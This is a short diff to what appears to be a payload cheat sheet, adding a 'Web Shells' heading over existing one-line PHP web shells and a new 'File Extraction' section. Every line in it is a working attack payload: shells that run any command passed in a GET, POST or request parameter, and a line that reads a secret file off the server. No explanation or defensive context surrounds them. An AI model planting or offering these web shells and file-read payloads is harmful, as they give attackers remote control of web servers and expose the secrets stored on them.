@@ -1,3 +1,4 @@
+###Web Shells
 <?php echo passthru($_GET['cmd']); ?>
 
 <?php echo exec($_POST['cmd']); ?>
@@ -5,3 +6,6 @@
 <?php system($_GET['cmd']); ?>
 
 <?php passthru($_REQUEST['cmd']); ?>
+
+###File Extraction
+<?php echo file_get_contents('/home/user/secret'); ?>
